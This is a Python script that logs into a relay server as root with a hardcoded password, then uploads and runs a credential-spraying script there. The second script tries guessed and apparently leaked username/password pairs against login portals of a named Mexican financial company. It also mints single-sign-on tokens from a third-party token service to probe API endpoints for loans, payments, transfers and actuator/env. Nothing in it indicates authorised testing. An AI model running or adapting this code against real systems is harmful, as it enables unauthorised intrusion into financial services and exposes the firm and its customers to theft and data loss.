import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

CREDS = [
    ("jcruzval", "Fisa1234*"),
    ("admin", "admin"),
    ("admin", "Fisa1234*"),
    ("administrador", "admin"),
    ("jcruzval", "jcruzval"),
]

# ========================================
# 1. PPP.FINDEP.MX LOGIN
# ========================================
sys.stdout.write("=" * 60 + "\n=== PPP.FINDEP.MX LOGIN ===\n" + "=" * 60 + "\n\n")

# First understand the form
r0 = s.get("https://ppp.findep.mx/khorLogin.asp", timeout=15)
sys.stdout.write(f"GET login: [{r0.status_code}] {len(r0.text)}b\n")

# Extract ALL form details
forms = re.findall(r'<form([^>]*)>(.*?)</form>', r0.text, re.S|re.I)
for i, (attrs, body) in enumerate(forms):
    action = re.search(r'action=["\']([^"\']+)["\']', attrs, re.I)
    method = re.search(r'method=["\']([^"\']+)["\']', attrs, re.I)
    name = re.search(r'name=["\']([^"\']+)["\']', attrs, re.I)
    sys.stdout.write(f"\nForm {i}: action={action.group(1) if action else '?'} method={method.group(1) if method else '?'} name={name.group(1) if name else '?'}\n")
    
    # All inputs in this form
    inputs = re.findall(r'<input([^>]+)>', body, re.I)
    for inp in inputs:
        inp_name = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
        inp_type = re.search(r'type=["\']([^"\']+)["\']', inp, re.I)
        inp_val = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
        inp_id = re.search(r'id=["\']([^"\']+)["\']', inp, re.I)
        sys.stdout.write(f"  name={inp_name.group(1) if inp_name else '?'} type={inp_type.group(1) if inp_type else '?'} id={inp_id.group(1) if inp_id else '?'} val={inp_val.group(1)[:50] if inp_val else ''}\n")

# Find the actual login URL from JS
login_js = re.findall(r'(?:action|href|src|url)\s*[=:]\s*["\']([^"\']*(?:login|valida|auth|sesion|acceso)[^"\']*)["\']', r0.text, re.I)
sys.stdout.write(f"\nLogin-related URLs in page: {login_js}\n")

# Try the mode=1 (Persona) form submission
sys.stdout.write("\n--- Login attempts (mode=Persona) ---\n")
for user, pwd in CREDS:
    try:
        r_fresh = s.get("https://ppp.findep.mx/khorLogin.asp", timeout=10)
        
        data = {
            "modo": "1",
            "embedded": "0",
            "usr": user,
            "pwd": pwd,
        }
        r = s.post("https://ppp.findep.mx/khorLogin.asp", data=data, timeout=15, allow_redirects=False)
        
        loc = r.headers.get('Location', '')
        body_preview = r.text[:500] if r.text else ""
        
        tag = ""
        if r.status_code in [301, 302, 303] and 'login' not in loc.lower():
            tag = " *** REDIRECT - POSSIBLE SUCCESS ***"
        if 'bienvenido' in body_preview.lower() or 'dashboard' in body_preview.lower() or 'inicio' in body_preview.lower() or 'menu' in body_preview.lower():
            tag = " *** SUCCESS ***"
        if 'incorrecto' in body_preview.lower() or 'invalid' in body_preview.lower():
            tag = " (WRONG)"
        if 'no existe' in body_preview.lower() or 'no encontr' in body_preview.lower():
            tag = " (USER NOT FOUND)"
        if r.status_code == 200 and len(r.text) != len(r0.text):
            tag += f" (SIZE DIFF: {len(r0.text)} vs {len(r.text)})"
        
        sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={loc[:80]}{tag}\n")
        
        # Check if cookies changed (new session = possible login)
        new_cookies = {c.name: c.value[:30] for c in r.cookies}
        if new_cookies:
            sys.stdout.write(f"    New cookies: {new_cookies}\n")
        
        # If redirect, follow
        if loc:
            try:
                r2 = s.get(loc if loc.startswith('http') else f"https://ppp.findep.mx/{loc}", timeout=10, allow_redirects=True)
                sys.stdout.write(f"    -> [{r2.status_code}] {len(r2.text)}b {r2.url[:80]}\n")
                title = re.search(r'<title>(.*?)</title>', r2.text[:3000], re.I)
                if title:
                    sys.stdout.write(f"    Title: {title.group(1)[:80]}\n")
            except:
                pass
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {str(e)[:80]}\n")
    sys.stdout.flush()

# Also try mode=2 (Admin)
sys.stdout.write("\n--- Login attempts (mode=Admin) ---\n")
for user, pwd in CREDS[:3]:
    try:
        data = {"modo": "2", "embedded": "0", "usr": user, "pwd": pwd}
        r = s.post("https://ppp.findep.mx/khorLogin.asp", data=data, timeout=15, allow_redirects=False)
        loc = r.headers.get('Location', '')
        tag = ""
        if r.status_code in [301, 302, 303] and 'login' not in loc.lower():
            tag = " *** REDIRECT ***"
        if r.status_code == 200 and len(r.text) != len(r0.text):
            tag += f" (SIZE DIFF)"
        sys.stdout.write(f"  [Admin] {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={loc[:80]}{tag}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {e}\n")
    sys.stdout.flush()


# ========================================
# 2. PAO / FOOTPRINTS LOGIN
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PAO.FINDEP.COM.MX FOOTPRINTS LOGIN ===\n" + "=" * 60 + "\n\n")

r0 = s.get("https://pao.findep.com.mx/MRcgi/MRlogin.pl", timeout=15)
sys.stdout.write(f"GET login: [{r0.status_code}] {len(r0.text)}b\n")

# Extract form fields
inputs_fp = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', r0.text, re.I)
sys.stdout.write(f"Inputs: {[(n,t,v[:30]) for n,t,v in inputs_fp]}\n")

form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', r0.text, re.I)
fp_action = form_action.group(1) if form_action else "MRlogin.pl"
sys.stdout.write(f"Form action: {fp_action}\n")

for user, pwd in CREDS:
    try:
        r_fresh = s.get("https://pao.findep.com.mx/MRcgi/MRlogin.pl", timeout=10)
        hidden = {n: v for n, t, v in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?(?:[^>]+value=["\']([^"\']*)["\'])?', r_fresh.text, re.I) if t and t.lower() == 'hidden'}
        
        data = dict(hidden)
        data["MESSION_USERNAME"] = user
        data["MESSION_PASSWORD"] = pwd
        data["USER"] = user
        data["PASSWORD"] = pwd
        
        action_url = f"https://pao.findep.com.mx/MRcgi/{fp_action}" if not fp_action.startswith('http') else fp_action
        r = s.post(action_url, data=data, timeout=15, allow_redirects=False)
        loc = r.headers.get('Location', '')
        tag = ""
        if r.status_code in [301, 302] and 'login' not in loc.lower():
            tag = " *** REDIRECT ***"
        if 'invalid' in r.text[:500].lower() or 'incorrecto' in r.text[:500].lower() or 'failed' in r.text[:500].lower():
            tag = " (WRONG)"
        if 'welcome' in r.text[:500].lower() or 'inicio' in r.text[:500].lower():
            tag = " *** SUCCESS ***"
        sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={loc[:80]}{tag}\n")
        if r.status_code == 200 and len(r.text) > 200:
            sys.stdout.write(f"    Body: {r.text[:400]}\n")
    except Exception as e:
        sys.stdout.write(f"  {user}:{pwd} -> ERR: {str(e)[:80]}\n")
    sys.stdout.flush()


# ========================================
# 3. WIKI LOGIN
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== WIKI.FINDEP.MX LOGIN ===\n" + "=" * 60 + "\n\n")

try:
    r0 = s.get("https://wiki.findep.mx/login", timeout=15, allow_redirects=True)
    sys.stdout.write(f"GET login: [{r0.status_code}] {len(r0.text)}b URL={r0.url[:80]}\n")
    
    title = re.search(r'<title>(.*?)</title>', r0.text[:3000], re.I)
    sys.stdout.write(f"Title: {title.group(1)[:80] if title else 'N/A'}\n")
    
    # Check if it's Confluence, MediaWiki, DokuWiki, etc
    for tech in ['confluence', 'mediawiki', 'dokuwiki', 'xwiki', 'bookstack', 'gitea']:
        if tech in r0.text.lower():
            sys.stdout.write(f"DETECTED: {tech}\n")
    
    # Extract forms
    forms = re.findall(r'<form([^>]*)>(.*?)</form>', r0.text, re.S|re.I)
    for i, (attrs, body) in enumerate(forms):
        action = re.search(r'action=["\']([^"\']+)["\']', attrs, re.I)
        sys.stdout.write(f"\nForm: action={action.group(1)[:80] if action else '?'}\n")
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?', body, re.I)
        for n, t in inputs:
            sys.stdout.write(f"  name={n} type={t or '?'}\n")
    
    sys.stdout.write(f"\nBody preview: {r0.text[:2000]}\n")
    
    # Try login
    for user, pwd in CREDS:
        try:
            hidden = {n: v for n, v in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', r0.text, re.I)}
            data = dict(hidden)
            
            for n, t in re.findall(r'<input[^>]+name=["\']([^"\']+)["\'](?:[^>]+type=["\']([^"\']+)["\'])?', r0.text, re.I):
                if t and t.lower() == 'password':
                    data[n] = pwd
                elif 'user' in n.lower() or 'name' in n.lower() or 'login' in n.lower():
                    data[n] = user
            
            if not data or len(data) < 2:
                data = {"os_username": user, "os_password": pwd, "login": "Log in"}
            
            form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', r0.text, re.I)
            login_url = form_action.group(1) if form_action else "https://wiki.findep.mx/login"
            if not login_url.startswith('http'):
                login_url = "https://wiki.findep.mx" + (login_url if login_url.startswith('/') else '/' + login_url)
            
            r = s.post(login_url, data=data, timeout=15, allow_redirects=False)
            loc = r.headers.get('Location', '')
            tag = ""
            if r.status_code in [301, 302] and 'login' not in loc.lower() and 'error' not in loc.lower():
                tag = " *** POSSIBLE SUCCESS ***"
            sys.stdout.write(f"  {user}:{pwd} -> [{r.status_code}] {len(r.text)}b Loc={loc[:80]}{tag}\n")
        except Exception as e:
            sys.stdout.write(f"  {user}:{pwd} -> ERR: {e}\n")
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"ERR: {e}\n")


# ========================================
# 4. FINDEP-HAWKING DEEP
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== FINDEP-HAWKING.TYSONPROD.COM DEEP ===\n" + "=" * 60 + "\n\n")

try:
    r = s.get("https://findep-hawking.tysonprod.com/", timeout=10)
    sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
    sys.stdout.write(f"Body: {r.text[:3000]}\n\n")
    
    # Mint a hawking token and try
    r_tok = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
        json={"appJwt": "FINDEP-HAWKING", "serviceName": "hawking-service"}, timeout=10)
    tok = r_tok.json().get("token", "")
    sys.stdout.write(f"Token minted: {tok[:60]}...\n\n")
    
    # Decode JWT
    parts = tok.split(".")
    if len(parts) == 3:
        pad = lambda ss: ss + "=" * (-len(ss) % 4)
        header = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        sys.stdout.write(f"JWT Header: {json.dumps(header)}\n")
        sys.stdout.write(f"JWT Payload: {json.dumps(payload)}\n\n")
    
    # Try API endpoints with token
    paths = [
        "/", "/api", "/api/v1", "/v1",
        "/api/auth", "/api/login", "/api/users",
        "/api/clients", "/api/loans", "/api/credits",
        "/api/spei", "/api/payments", "/api/transfers",
        "/api/accounts", "/api/customers",
        "/api/waitlist",
        "/health", "/actuator", "/actuator/health",
        "/actuator/env", "/actuator/info",
        "/swagger-ui.html", "/swagger-ui/",
        "/v2/api-docs", "/v3/api-docs",
        "/graphql",
    ]
    
    for p in paths:
        try:
            r2 = s.get(f"https://findep-hawking.tysonprod.com{p}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=5, allow_redirects=False)
            if r2.status_code not in [404]:
                sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b) {r2.text[:300]}\n")
        except:
            pass
        sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"ERR: {e}\n")


# ========================================
# 5. FINDEP.TYSONBETA.COM DEEP
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== FINDEP.TYSONBETA.COM DEEP ===\n" + "=" * 60 + "\n\n")

try:
    r = s.get("https://findep.tysonbeta.com/", timeout=10, allow_redirects=True)
    sys.stdout.write(f"[{r.status_code}] {len(r.text)}b URL={r.url[:80]}\n")
    title = re.search(r'<title>(.*?)</title>', r.text[:3000], re.I)
    sys.stdout.write(f"Title: {title.group(1)[:80] if title else 'N/A'}\n")
    sys.stdout.write(f"Body: {r.text[:2000]}\n\n")
    
    for p in ["/login", "/api", "/actuator", "/health", "/swagger-ui/", "/v2/api-docs"]:
        try:
            r2 = s.get(f"https://findep.tysonbeta.com{p}", timeout=5, allow_redirects=False)
            if r2.status_code not in [404]:
                sys.stdout.write(f"  [{r2.status_code}] {p} ({len(r2.text)}b)\n")
        except:
            pass
except Exception as e:
    sys.stdout.write(f"ERR: {e}\n")


# ========================================
# 6. DNS RESOLUTION
# ========================================
sys.stdout.write("\n\n=== DNS ===\n")
import socket
for h in ["ppp.findep.mx", "sif.findep.mx", "pao.findep.com.mx",
          "findep-hawking.tysonprod.com", "findep.tysonbeta.com", "wiki.findep.mx"]:
    try:
        ips = set(x[4][0] for x in socket.getaddrinfo(h, 443, socket.AF_INET))
        sys.stdout.write(f"  {h} -> {', '.join(ips)}\n")
    except Exception as e:
        sys.stdout.write(f"  {h} -> ERR: {e}\n")

sys.stdout.write("\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/login_all.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/login_all.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
